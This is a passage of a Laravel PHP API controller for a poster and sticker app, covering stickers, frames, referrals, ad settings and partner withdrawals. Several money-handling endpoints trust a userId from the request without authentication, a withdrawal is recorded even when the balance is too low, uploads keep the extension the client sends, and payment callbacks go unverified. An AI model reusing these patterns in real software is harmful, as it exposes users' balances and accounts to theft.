                "sticker" => $sticker_data
            );
        }
            
        return response()->json([
            "StickerCategory" => $stickerCategory,
            "data" => $data,
        ], 200);
    }

    public function searchSticker(Request $request)
    {
        $category = StickerCategory::where('name','LIKE', "%$request->keyword%")->where('status',1)->get();
        if(!$category->isEmpty())
        {
            $sticker_data = [];
            foreach ($category as $c) {
                $sticker = Sticker::where('sticker_category_id',$c->id)->where('status',1)->get();
                foreach ($sticker as $s) {
                    $sticker_data[] = array(
                        "stickerId" => $s->id,
                        "stickerCategoryId" => $s->sticker_category_id,
                        "stickerCategoryName" => $s->sticker_category->name,
                        "stickerImage" => ($s->image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$s->image):asset('uploads/'.$s->image)):"",
                    );
                }
            }
            return $sticker_data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function userCustomFrame(Request $request)
    {
        $custom = CustomFrame::where("user_id",$request->userId)->get();

        if(!$custom->isEmpty())
        {
            foreach ($custom as $c) 
            {
                $data[] = array(
                    "id" => $c->id,
                    "frameImage" => ($c->frame_image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$c->frame_image):asset('uploads/'.$c->frame_image)):"",
                );
            }
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
        return $data;
    }

    public function referral_detail(Request $request)
    {
        $user = User::find($request->get("userId"));
        if(!empty($user))
        {
            if(empty($user->referral_code)) {
                $user->referral_code = strtoupper(\Illuminate\Support\Str::random(10));
                $user->save();
            }

            $earning = EarningHistory::where('user_id',$request->get("userId"))->get();
            $earning_data = [];
            foreach($earning as $e)
            {
                $earning_data[] = array(
                    "user" => $e->referUser->name,
                    "amount" => ($e->amount_type==1)?"+".$e->amount:"-".$e->amount,
                    "date" => date('d M, y',strtotime($e->created_at))
                );
            }
            $data = array(
                "referralCode" => $user->referral_code,
                "currentBalance" => $user->current_balance,
                "totalBalance" => $user->total_balance,
                "totalReferUser" => ReferralRegister::where('referral_code',$user->referral_code)->count(),
                "totalSubscriptionUsingRefer" => ReferralRegister::where('referral_code',$user->referral_code)->where("subscription",1)->count(),
                "earningHistory" => $earning_data
            );

            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid User Id",
            ], 200);
        }
    }

    public function withdraw_request(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'userId' => 'required',
            'upiId' => 'required',
            "withdrawAmount" => 'required|numeric',
        ]);

        if ($validation->fails()) {
            $errors = [];

            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } 
        else 
        {
            $user = User::find($request->get("userId"));
            if(!empty($user))
            {
                if($request->get("withdrawAmount") >= ReferralSystem::getReferralSystem('withdrawal_limit'))
                {
                    $id = WithdrawRequest::create([
                        "user_id" => $request->get("userId"),
                        "upi_id" => $request->get("upiId"),
                        "withdraw_amount" => $request->get("withdrawAmount"),
                    ])->id;

                    $req = WithdrawRequest::find($id);
                    $referral_user = User::find($req->user_id);

                    if($req->withdraw_amount <= $referral_user->current_balance)
                    {
                        $referral_user = User::find($req->user_id);
                        $referral_user->current_balance = $referral_user->current_balance - $req->withdraw_amount;
                        $referral_user->save();
                
                        EarningHistory::create([
                            "user_id" => $referral_user->id,
                            "amount" => $req->withdraw_amount,
                            "amount_type" => 0,
                            "refer_user" => $referral_user->id,
                        ]);
                    }

                    return response()->json([
                        'status' => "success",
                        'message' => "Withdraw Request Send Successfully!",
                    ], 200);
                }
                else
                {
                    return response()->json([
                        'status' => "Error",
                        'message' => "Withdraw Limit ".ReferralSystem::getReferralSystem('withdrawal_limit'),
                    ], 404);
                }
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "Invalid User Id",
                ], 404);
            }
        }
    }

    public function posterCategory()
    {
        $category = PosterCategory::where('status',1)->get();

        if(!$category->isEmpty())
        {
            foreach ($category as $cat) {
                $data[] = array(
                    "frameCategoryId" => $cat->id,
                    "frameCategoryName" => $cat->name,
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function getPosterJson(Request $request)
    {
        $poster = PosterMaker::get();
        if(!$poster->isEmpty())
        {
            foreach($poster as $p)
            {
                if(StorageSetting::getStorageSetting('storage') == 'DigitalOcean')
                {
                    $file = Storage::disk('spaces')->allFiles('uploads/template/'.$p->zip_name.'/json/');
                    $json_data = file_get_contents(Storage::disk('spaces')->url($file[0]));
                }
                else
                {
                    $file = scandir('./uploads/template/'.$p->zip_name.'/json/', 1);
                    $json_data = file_get_contents(asset('uploads/template/'.$p->zip_name.'/json/'.$file[0]));
                }

                $data[] = array(
                    "category_name" => $p->poster_category->name,
                    "name" => $p->zip_name,
                    "ratio" => $p->template_type,
                    "thumbnail" => ($p->post_thumb)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$p->post_thumb):asset('uploads/'.$p->post_thumb)):"",
                    "is_paid" => ($p->paid==1)?true:false,
                    "theme" => $p->theme ?? 'all',
                    "req_address" => $p->req_address ?? 0,
                    "req_email" => $p->req_email ?? 0,
                    "req_phone" => $p->req_phone ?? 0,
                    "req_website" => $p->req_website ?? 0,
                    "json" => $json_data,
                );
            }

            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function from_camel_case($str)
    {
        $i = array("-","_");
        $str = preg_replace('/([a-z])([A-Z])/', "\\1 \\2", $str);
        $str = preg_replace('@[^a-zA-Z0-9\-_ ]+@', '', $str);
        $str = str_replace($i, ' ', $str);
        $str = str_replace(' ', '', ucwords(strtolower($str)));
        $str = strtolower(substr($str,0,1)).substr($str,1);
        return $str;
    }

    private function upload_image($file,$field,$id)
    {
        $destinationPath = './uploads';
        $extension = $file->getClientOriginalExtension();
        $fileName = Str::uuid() . '.' . $extension;
        $file->move($destinationPath, $fileName);
        
        $image = Business::find($id);
        $image->$field = $fileName;
        $image->save();
    }

    public function phonepe_callback(Request $request)
    {
        try {
            $responseData = ['status' => 200, 'message' => 'Phonepe event received successfully'];
            return response()->json($responseData, 200);
        } catch (\Throwable $th) {
            $responseData = ['status' => 200, 'message' => 'Phonepe event received successfully'];
            return response()->json($responseData, 200);
        }
    }

    /**
     * SaaS Feature Consumption Endpoint.
     * Called by Flutter after a user downloads/uses a feature.
     * Also supports AdMob Rewarded Video extension: if 'ad_rewarded' is true,
     * the user watched an ad and gets +1 usage even if their limit was reached.
     */
    public function consumeFeature(Request $request)
    {
        $user = auth()->guard('api')->user();
        if (!$user) $user = auth()->user();
        if (!$user) {
            return response()->json(['success' => false, 'message' => 'Unauthorized'], 401);
        }

        $feature = $request->get('feature');
        $validFeatures = ['custom_post', 'magic_cloner', 'festival_post', 'business_category_post'];

        if (!$feature || !in_array($feature, $validFeatures)) {
            return response()->json(['success' => false, 'message' => 'Invalid feature key.'], 422);
        }

        // Check if this is an ad-rewarded extension request
        $isAdRewarded = $request->get('ad_rewarded', false);

        if ($isAdRewarded) {
            // User watched an AdMob Rewarded Video — verify their plan allows ad rewards for this feature
            if ($user->isAdRewardEnabledForFeature($feature)) {
                // Track that they watched an ad
                $user->consumeAdReward($feature);

                // Grant +1 usage by NOT checking limit, just consuming directly
                $fieldMap = [
                    'custom_post'            => 'custom_post_used',

                    'magic_cloner'           => 'magic_cloner_used',
                    'festival_post'          => 'festival_post_used',
                    'business_category_post' => 'business_category_post_used',
                ];
                // Reset the used counter by 1 to allow one more use
                if ($user->{$fieldMap[$feature]} > 0) {
                    $user->decrement($fieldMap[$feature]);
                }

                return response()->json([
                    'success' => true,
                    'message' => 'Ad reward applied! You unlocked 1 more use.',
                    'remaining' => $user->getRemainingUsage($feature),
                    'ad_reward_enabled' => true,
                ]);
            } else {
                return response()->json([
                    'success' => false,
                    'message' => 'Ad rewards are not available or you have reached your monthly rewarded ad limit for this feature. Please upgrade.',
                    'ad_reward_enabled' => false,
                ], 403);
            }
        }

        // Normal consumption flow
        $consumed = $user->consumeFeature($feature);

        if ($consumed) {
            return response()->json([
                'success' => true,
                'message' => 'Feature consumed successfully.',
                'remaining' => $user->getRemainingUsage($feature),
                'ad_reward_enabled' => $user->isAdRewardEnabledForFeature($feature),
            ]);
        } else {
            $isAdEnabled = $user->isAdRewardEnabledForFeature($feature);
            return response()->json([
                'success' => false,
                'is_limit_reached' => true,
                'feature' => $feature,
                'ad_reward_enabled' => $isAdEnabled,
                'message' => $isAdEnabled
                    ? 'Limit reached. Watch an ad to unlock more.'
                    : 'Limit reached. Please upgrade your plan.',
            ], 403);
        }
    }

    /**
     * Get frames for a specific festival/category/custom post.
     * Matches the web's universal_details controller logic.
     * Usage: GET /get-frames?type=festival&id=5
     */
    public function getFrames(Request $request)
    {
        $type = $request->get('type');
        $id = $request->get('id');
        
        if (!$type || !$id) {
            return response()->json(['status' => 'Error', 'message' => 'type and id are required'], 400);
        }

        $frames_data = [];
        $videos_data = [];
        $item_name = '';
        $item_image = '';

        // Fetch videos for this specific type and ID
        $videosQuery = \App\Models\Video::where('status', 1);
        if ($type == 'festival') {
            $videosQuery->where('type', 'festival')->where('festival_id', $id);
        } elseif ($type == 'category') {
            $videosQuery->where('type', 'category')->where('category_id', $id);
        } elseif ($type == 'custom') {
            $videosQuery->where('type', 'businessCategory')->where('business_category_id', $id);
        } else {
            $videosQuery->whereRaw('1 = 0');
        }
        $videos = $videosQuery->get();
        
        foreach ($videos as $video) {
            $videos_data[] = [
                'videoId' => $video->id,
                'videoUrl' => (StorageSetting::getStorageSetting('storage') == 'DigitalOcean') ? Storage::disk('spaces')->url('uploads/video/'.$video->video) : asset('uploads/video/'.$video->video),
                'isPaid' => ($video->paid == 1) ? true : false,
            ];
        }

        if ($type == 'festival') {
            $item = Festivals::find($id);
            if (!$item) {
                return response()->json(['status' => 'Error', 'message' => 'Festival not found'], 404);
            }
            $item_name = $item->title;
            $item_image = ($item->image) ? ((StorageSetting::getStorageSetting('storage') == 'DigitalOcean') ? Storage::disk('spaces')->url('uploads/'.$item->image) : asset('uploads/'.$item->image)) : '';
            
            $frames = FestivalsPost::where('festivals_id', $id)->where('status', 1)->orderBy('id', 'desc')->get();
            foreach ($frames as $f) {
                $frames_data[] = [
                    'frameId' => $f->id,
                    'type' => 'festival',
                    'image' => ($f->frame_image) ? ((StorageSetting::getStorageSetting('storage') == 'DigitalOcean') ? Storage::disk('spaces')->url('uploads/'.$f->frame_image) : asset('uploads/'.$f->frame_image)) : '',
                    'language' => $f->language ? $f->language->title : 'All',
                    'languageId' => $f->language_id,
                    'isPaid' => ($f->paid == 1) ? true : false,
                    'isAi' => ($f->is_ai == 1) ? true : false,
                    'height' => $f->height,
                    'width' => $f->width,
                    'imageType' => $f->image_type,
                    'aspectRatio' => $f->aspect_ratio,
                ];
            }
        } elseif ($type == 'category') {
            $item = Category::find($id);
            if (!$item) {
                return response()->json(['status' => 'Error', 'message' => 'Category not found'], 404);
            }
            $item_name = $item->name;
            $item_image = ($item->icon) ? ((StorageSetting::getStorageSetting('storage') == 'DigitalOcean') ? Storage::disk('spaces')->url('uploads/'.$item->icon) : asset('uploads/'.$item->icon)) : '';
            
            $frames = CategoryPost::where('category_id', $id)->where('status', 1)->orderBy('id', 'desc')->get();
            foreach ($frames as $c) {
                $frames_data[] = [
                    'frameId' => $c->id,
                    'type' => 'category',
                    'image' => ($c->frame_image) ? ((StorageSetting::getStorageSetting('storage') == 'DigitalOcean') ? Storage::disk('spaces')->url('uploads/'.$c->frame_image) : asset('uploads/'.$c->frame_image)) : '',
                    'language' => $c->language ? $c->language->title : 'All',
                    'languageId' => $c->language_id,
                    'isPaid' => ($c->paid == 1) ? true : false,
                    'isAi' => ($c->is_ai == 1) ? true : false,
                    'height' => $c->height,
                    'width' => $c->width,
                    'imageType' => $c->image_type,
                    'aspectRatio' => $c->aspect_ratio,
                ];
            }
        } elseif ($type == 'custom') {
            $item = \App\Models\CustomPost::find($id);
            if (!$item) {
                return response()->json(['status' => 'Error', 'message' => 'Custom post not found'], 404);
            }
            $item_name = $item->name;
            $item_image = ($item->icon) ? ((StorageSetting::getStorageSetting('storage') == 'DigitalOcean') ? Storage::disk('spaces')->url('uploads/'.$item->icon) : asset('uploads/'.$item->icon)) : '';
            
            $frames = \App\Models\CustomPostFrame::where('custom_post_id', $id)->where('status', 1)->orderBy('id', 'desc')->get();
            foreach ($frames as $cc) {
                $zip_name = $cc->zip_name ?? '';
                $json_data = '';
                if ($zip_name) {
                    if (StorageSetting::getStorageSetting('storage') == 'DigitalOcean') {
                        $file = Storage::disk('spaces')->allFiles('uploads/template/'.$zip_name.'/json/');
                        if (!empty($file)) {
                            $json_data = file_get_contents(Storage::disk('spaces')->url($file[0]));
                        }
                    } else {
                        if (is_dir('./uploads/template/'.$zip_name.'/json/')) {
                            $file = scandir('./uploads/template/'.$zip_name.'/json/', 1);
                            if (isset($file[0]) && $file[0] != '.' && $file[0] != '..') {
                                $json_data = file_get_contents(asset('uploads/template/'.$zip_name.'/json/'.$file[0]));
                            }
                        }
                    }
                }
                $frames_data[] = [
                    'frameId' => $cc->id,
                    'type' => 'custom',
                    'image' => ($cc->frame_image) ? ((StorageSetting::getStorageSetting('storage') == 'DigitalOcean') ? Storage::disk('spaces')->url('uploads/'.$cc->frame_image) : asset('uploads/'.$cc->frame_image)) : '',
                    'language' => $cc->language ? $cc->language->title : 'All',
                    'languageId' => $cc->language_id ?? 0,
                    'isPaid' => ($cc->paid == 1) ? true : false,
                    'height' => $cc->height,
                    'width' => $cc->width,
                    'imageType' => $cc->image_type,
                    'aspectRatio' => $cc->aspect_ratio,
                    'zipName' => $zip_name,
                    'json' => $json_data,
                ];
            }
        } elseif ($type == 'business_custom') {
            // Business Custom Frames (from CustomFramePurpose)
            $custom_frame = \App\Models\BusinessCustomFrame::where('custom_frame_purpose_id', $id)->where('status', 1)->orderBy('id', 'desc')->get();
            foreach ($custom_frame as $frame) {
                $zip_name = pathinfo($frame->zip_file_path ?? '', PATHINFO_FILENAME);
                $preview_img = '';
                if ($zip_name) {
                    if (StorageSetting::getStorageSetting('storage') == 'DigitalOcean') {
                        $preview_img = Storage::disk('spaces')->url('uploads/template/'.$zip_name.'/preview.jpg');
                    } else {
                        $dir = public_path('uploads/template/'.$zip_name.'/');
                        if (is_dir($dir)) {
                            if (file_exists($dir.'preview.jpg')) {
                                $preview_img = asset('uploads/template/'.$zip_name.'/preview.jpg');
                            } elseif (file_exists($dir.'preview.png')) {
                                $preview_img = asset('uploads/template/'.$zip_name.'/preview.png');
                            } else {
                                $files = glob($dir . '*.{jpg,jpeg,png}', GLOB_BRACE);
                                if (!empty($files)) {
                                    $preview_img = asset('uploads/template/'.$zip_name.'/'.basename($files[0]));
                                }
                            }
                        }
                    }
                }
                $frames_data[] = [
                    'frameId' => $frame->id,
                    'type' => 'business_custom',
                    'image' => $preview_img,
                    'language' => 'All',
                    'languageId' => 0,
                    'isPaid' => false,
                    'height' => $frame->height ?? 1080,
                    'width' => $frame->width ?? 1080,
                    'imageType' => 'square',
                    'aspectRatio' => '1:1',
                    'zipName' => $zip_name,
                ];
            }
            $item_name = 'Custom Templates';
            $item_image = '';
        }

        return response()->json([
            'itemName' => $item_name,
            'itemImage' => $item_image,
            'frames' => $frames_data,
            'videos' => $videos_data,
            'totalFrames' => count($frames_data),
        ], 200);
    }

    /**
     * Get Ad Configuration for the Flutter app.
     * Serves all AdMob/network settings from the ads_setting table
     * so the admin can control ad unit IDs and enable/disable flags
     * server-side without requiring an app update.
     *
     * Usage: GET /ad-config
     */
    public function getAdConfig()
    {
        $settings = \Illuminate\Support\Arr::pluck(
            AdsSetting::all()->toArray(), 'key_value', 'key_name'
        );

        return response()->json([
            'admob' => [
                'enabled'               => $settings['ads_enable'] ?? '0',
                'app_id_android'        => $settings['publisher_id'] ?? '',
                'app_id_ios'            => $settings['publisher_id'] ?? '',
                'banner_id_android'     => $settings['banner_ads_id'] ?? '',
                'banner_id_ios'         => $settings['banner_ads_id'] ?? '',
                'interstitial_id_android' => $settings['interstitial_ads_id'] ?? '',
                'interstitial_id_ios'   => $settings['interstitial_ads_id'] ?? '',
                'rewarded_id_android'   => $settings['rewarded_ads_id'] ?? '',
                'rewarded_id_ios'       => $settings['rewarded_ads_id'] ?? '',
                'native_id_android'     => $settings['native_ads_id'] ?? '',
                'native_id_ios'         => $settings['native_ads_id'] ?? '',
            ],
            'meta_audience' => [
                'enabled'    => $settings['meta_ads_enable'] ?? '0',
                'app_id'     => $settings['meta_ads_app_id'] ?? '',
            ],
            'applovin' => [
                'enabled'    => $settings['applovin_enable'] ?? '0',
                'sdk_key'    => $settings['applovin_sdk_key'] ?? '',
            ],
            'frequency_cap' => [
                'interstitial_cooldown_minutes' => $settings['interstitial_cooldown_minutes'] ?? '10',
                'max_interstitials_per_day'     => $settings['max_interstitials_per_day'] ?? '5',
            ],
        ], 200);
    }

    public function getNotifications()
    {
        $notifications = UserNotification::orderBy('created_at', 'desc')->get();
        $data = [];
        foreach ($notifications as $n) {
            $data[] = [
                'id' => $n->id,
                'title' => $n->title,
                'message' => $n->message,
                'image' => ($n->image) ? ((StorageSetting::getStorageSetting('storage') == 'DigitalOcean') ? Storage::disk('spaces')->url('uploads/' . $n->image) : asset('uploads/' . $n->image)) : "",
                'type' => $n->type,
                'type_id' => $n->type_id,
                'created_at' => $n->created_at->toDateTimeString(),
            ];
        }
        return response()->json($data, 200);
    }

    public function getPartnerDashboard(Request $request)
    {
        $userId = $request->userId;
        $user = User::find($userId);

        if (!$user || !$user->is_partner) {
            return response()->json([
                'status' => 'Error',
                'message' => 'User is not a partner or invalid user.',
            ], 404);
        }

        $hold_days = \App\Models\ReferralSystem::getReferralSystem('partner_refund_hold_days') ?? 7;
        
        $transactions = \App\Models\Transaction::where('partner_id', $userId)
                        ->where('status', '!=', 'Failed')
                        ->orderBy('created_at', 'desc')
                        ->get();

        $total_earnings = 0;
        $approved_balance = 0;
        $pending_balance = 0;
        $history = [];

        foreach ($transactions as $t) {
            $total_earnings += $t->partner_commission_amount;

            $is_past_hold = strtotime($t->created_at . ' + ' . $hold_days . ' days') <= time();
            
            if ($t->partner_commission_status == 'pending') {
                if ($is_past_hold) {
                    $t->partner_commission_status = 'approved';
                    $t->save();
                    $approved_balance += $t->partner_commission_amount;
                } else {
                    $pending_balance += $t->partner_commission_amount;
                }
            } else if ($t->partner_commission_status == 'approved') {
                $approved_balance += $t->partner_commission_amount;
            }

            $history[] = [
                'transaction_id' => $t->id,
                'coupon_code' => $t->couponCode ? $t->couponCode->code : 'Unknown',
                'amount' => $t->partner_commission_amount,
                'status' => $t->partner_commission_status,
                'date' => $t->created_at->format('Y-m-d H:i:s'),
                'is_withdrawable' => $is_past_hold
            ];
        }

        // Subtract withdrawn amount from approved balance
        $withdrawals = \App\Models\WithdrawRequest::where('user_id', $userId)->sum('withdraw_amount');
        $available_to_withdraw = $approved_balance - $withdrawals;

        return response()->json([
            'status' => 'Success',
            'data' => [
                'total_earnings' => $total_earnings,
                'pending_balance' => $pending_balance,
                'approved_balance' => $approved_balance,
                'available_to_withdraw' => max(0, $available_to_withdraw),
                'total_withdrawn' => $withdrawals,
                'commission_percent' => $user->partner_commission_percent ?? \App\Models\ReferralSystem::getReferralSystem('partner_default_commission_percent') ?? 20,
                'history' => $history
            ]
        ], 200);
    }

    public function partnerWithdrawRequest(Request $request)
    {
        $userId = $request->userId;
        $amount = $request->amount;
        $upi_id = $request->upi_id; // Payment detail

        $user = User::find($userId);

        if (!$user || !$user->is_partner) {
            return response()->json([
                'status' => 'Error',
                'message' => 'User is not a partner or invalid user.',
            ], 404);
        }

        if ($amount < 1) {
             return response()->json([
                'status' => 'Error',
                'message' => 'Invalid amount.',
            ], 400);
        }

        $hold_days = \App\Models\ReferralSystem::getReferralSystem('partner_refund_hold_days') ?? 7;
        
        $transactions = \App\Models\Transaction::where('partner_id', $userId)
                        ->whereIn('partner_commission_status', ['approved', 'pending'])
                        ->get();

        $approved_balance = 0;
        foreach ($transactions as $t) {
            if ($t->partner_commission_status == 'pending') {
                $is_past_hold = strtotime($t->created_at . ' + ' . $hold_days . ' days') <= time();
                if ($is_past_hold) {
                    $t->partner_commission_status = 'approved';
                    $t->save();
                    $approved_balance += $t->partner_commission_amount;
                }
            } else if ($t->partner_commission_status == 'approved') {
                $approved_balance += $t->partner_commission_amount;
            }
        }

        $withdrawals = \App\Models\WithdrawRequest::where('user_id', $userId)->sum('withdraw_amount');
        $available_to_withdraw = $approved_balance - $withdrawals;

        if ($amount > $available_to_withdraw) {
            return response()->json([
                'status' => 'Error',
                'message' => 'Insufficient approved balance. Available: ' . $available_to_withdraw,
            ], 400);
        }

        \App\Models\WithdrawRequest::create([
            'user_id' => $userId,
            'withdraw_amount' => $amount,
            'upi_id' => $upi_id,
            'status' => 0 // Pending approval from admin
        ]);

        return response()->json([
            'status' => 'Success',
            'message' => 'Withdraw request submitted successfully.',
        ], 200);
    }
}